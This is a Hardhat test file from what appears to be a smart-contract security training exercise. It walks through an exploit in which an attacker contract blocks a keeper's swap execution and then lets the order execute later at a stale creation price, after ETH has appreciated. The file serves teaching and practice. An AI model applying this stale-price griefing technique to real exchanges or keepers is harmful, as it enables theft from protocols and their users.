const { expect } = require("chai");
const { ethers } = require("hardhat");
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

describe("Gas Manipulation Exercise 1", function () {
  /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

  let keeper, attacker, exchange, weth, usdc, orderCreationBlockNumber;

  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const WETH = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
  const BUY_WETH_SWAP_PATH = [USDC, WETH];
  const ORDER_USDC_AMOUNT = ethers.utils.parseUnits("100", 6);
  const ORDER_CREATION_PRICE = ethers.utils.parseEther("5000", 6); // 5,000 USDC per ETH

  const getKeeperPriceParams = (price, blockNumber) => ({
    price,
    blockNumber,
  });

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [keeper, attacker] = await ethers.getSigners();

    weth = await ethers.getContractAt(
      "contracts/interfaces/IWETH9.sol:IWETH9",
      WETH
    );
    usdc = await ethers.getContractAt(
      "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
      USDC
    );

    const TwoStepExchangeFactory = await ethers.getContractFactory(
      "contracts/gas-manipulation-1/TwoStepExchange.sol:TwoStepExchange",
      keeper
    );
    exchange = await TwoStepExchangeFactory.deploy();
  });

  it("Exploit", async () => {
    /** CODE YOUR SOLUTION HERE */

    // You spot the critical vulnerability and hastily code up your attack contract
    // TODO: Implement your AttackContract and then deploy it
    const AttackContractFactory = await ethers.getContractFactory(
        "contracts/gas-manipulation-1/solution/AttackContractSolved.sol:AttackContract",
        attacker
    );
    const attackContract = await AttackContractFactory.deploy();

    orderCreationBlockNumber = (await ethers.provider.getBlockNumber()) + 1;

    // It is currently the orderCreationBlockNumber, the price of Ether is $5,000 per ETH
    // TODO: Create a malicious order on the Exchange
    await exchange.createSwapOrder(
        BUY_WETH_SWAP_PATH,
        ORDER_USDC_AMOUNT,
        attackContract.address
    );

    // The keeper attempts to execute the order, but cannot
    await expect(exchange
      .connect(keeper)
      .executeSwapOrder(
        1,
        getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber)
      )).to.be.reverted;

    await mine(100);

    // 100 blocks have gone by and the price of Ether has appreciated to $6,000
    // TODO: Execute the exploit!
    await attackContract.flipSwitch();
  });

  after(async () => {
    // Now the keeper successfully executes the order.
    // Why was this an exploit? What were you able to do?
    await expect(
      exchange
        .connect(keeper)
        .executeSwapOrder(
          1,
          getKeeperPriceParams(ORDER_CREATION_PRICE, orderCreationBlockNumber)
        )
    )
      .to.emit(exchange, "SwapOrderExecuted")
      .withArgs(1, ORDER_CREATION_PRICE);
  });
});
